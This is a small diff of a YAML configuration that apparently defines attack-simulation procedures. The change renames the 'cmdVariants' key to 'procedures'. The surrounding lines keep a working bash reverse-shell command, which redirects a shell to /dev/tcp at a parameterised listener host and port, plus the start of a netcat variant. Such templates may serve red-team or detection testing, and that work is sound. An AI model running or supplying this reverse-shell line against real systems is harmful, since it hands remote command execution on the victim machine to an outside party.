@@ -14,7 +14,7 @@ parameters:
   LISTENER_PORT:
     type: int
     description: the listing port number
-cmdVariants:
+procedures:
   - key: bash
     Command: bash >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1 &
   - key: nc
